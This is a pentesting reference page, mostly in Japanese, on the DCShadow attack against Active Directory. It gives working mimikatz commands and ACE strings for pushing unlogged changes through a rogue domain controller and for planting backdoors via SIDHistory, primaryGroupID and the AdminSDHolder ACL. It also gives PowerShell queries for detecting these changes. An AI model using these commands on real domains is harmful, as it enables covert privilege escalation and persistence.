# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

AD に **新しい Domain Controller** を登録し、それを使用して、指定したオブジェクトに **属性**（SIDHistory、SPNs など）を **push** します。この際、**変更**に関する **ログ**を一切残しません。**DA** 権限が必要で、**root domain** 内にいる必要があります。\
誤ったデータを使用すると、非常に見苦しいログが表示されることに注意してください。<sup>[[2]](#references)</sup>

攻撃を実行するには、mimikatz のインスタンスが 2 つ必要です。1 つは SYSTEM 権限で RPC サーバーを起動するために使用します（ここで実行したい変更を指定する必要があります）。もう 1 つのインスタンスは、値を push するために使用します：
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
`mimikatz1` セッションでは **`elevate::token`** は機能しないことに注意してください。これはスレッドの権限を昇格させますが、必要なのは **プロセスの権限** を昇格させることです。\
「LDAP」オブジェクトを選択することもできます: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

DA または次の最小限の権限を持つユーザーから変更を push できます。

- **domain object**:
- _DS-Install-Replica_ (ドメインでの Replica の追加/削除)
- _DS-Replication-Manage-Topology_ (Replication Topology の管理)
- _DS-Replication-Synchronize_ (Replication の同期)
- **Configuration container** 内の **Sites object** (およびその子):
- _CreateChild and DeleteChild_
- **DC として登録されている computer の object**:
- _WriteProperty_ (Write ではない)
- **target object**:
- _WriteProperty_ (Write ではない)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) を使用して、権限のないユーザーにこれらの権限を付与できます（ただし、いくつかのログが残ることに注意してください）。これは DA 権限を持つ場合よりもはるかに制限されています。\
例: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` これは、マシン _**mcorp-student1**_ にログオンしているユーザー名 _**student1**_ が、オブジェクト _**root1user**_ に対する DCShadow 権限を持つことを意味します。

## Using DCShadow to create backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group の abuse、enumeration の gaps、検知

- `primaryGroupID` は group の `member` list とは別の attribute です。DCShadow/DSInternals はこれを直接書き込めます（例: **Domain Admins** に対して `primaryGroupID=512` を設定）。on-box LSASS enforcement は適用されませんが、AD は user を **移動** させます。PGID を変更すると、以前の primary group からの membership は必ず削除されます（対象となる group に関係なく同じ動作です）。そのため、以前の primary-group membership を維持することはできません。<sup>[[1]](#references)</sup>
- Default tools は、user を現在の primary group から削除することを防ぎます（`ADUC`、`Remove-ADGroupMember`）。そのため、PGID の変更には通常、直接の directory writes（DCShadow/`Set-ADDBPrimaryGroup`）が必要です。
- Membership の reporting には一貫性がありません:
- **primary-group から導出された members を含む**: `Get-ADGroupMember "Domain Admins"`、`net group "Domain Admins"`、ADUC/Admin Center。
- **primary-group から導出された members を省略する**: `Get-ADGroup "Domain Admins" -Properties member`、ADSI Edit で `member` を確認する場合、`Get-ADUser <user> -Properties memberOf`。
- **primary group 自体が nested の場合**、recursive checks では primary-group members を見落とす可能性があります（例: user の PGID が、Domain Admins 内の nested group を指している場合）。`Get-ADGroupMember -Recursive` や LDAP recursive filters は、recursion で primary groups を明示的に解決しない限り、その user を返しません。
- DACL tricks: attackers は user の `primaryGroupID` に対して（または AdminSDHolder で保護されていない groups の `member` attribute に対して）**deny ReadProperty** を設定し、ほとんどの PowerShell queries から effective membership を隠すことができます。`net group` は引き続き membership を解決します。AdminSDHolder で保護された groups は、このような denies を reset します。

Detection/monitoring の例:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
特権グループを、`Get-ADGroupMember` の出力と `Get-ADGroup -Properties member` または ADSI Edit の結果と比較して cross-check し、`primaryGroupID` や hidden attributes によって生じた不一致を検出します。<sup>[[1]](#references)</sup>

## Shadowception - DCShadow を使用して DCShadow permissions を付与する（変更された permissions logs なし）

以下の ACEs に、ユーザーの SID を付けて末尾に追加する必要があります。<sup>[[2]](#references)</sup>

- domain object:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- attacker computer object: `(A;;WP;;;UserSID)`
- target user object: `(A;;WP;;;UserSID)`
- Configuration container 内の Sites object: `(A;CI;CCDC;;;UserSID)`

object の現在の ACE を取得するには: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

この場合、1つだけではなく**複数の変更**を行う必要があります。**`mimikatz1 session**（RPC server）で、各変更に対して **`/stack` parameter を使用します。次に、rogue server から stack されたすべての変更を適用するため、**`/push`** を1回だけ実行します。

[**ired.team の DCShadow に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Primary Group の動作、レポート、および Exploitation に関する考察](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [ired.team の DCShadow write-up](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
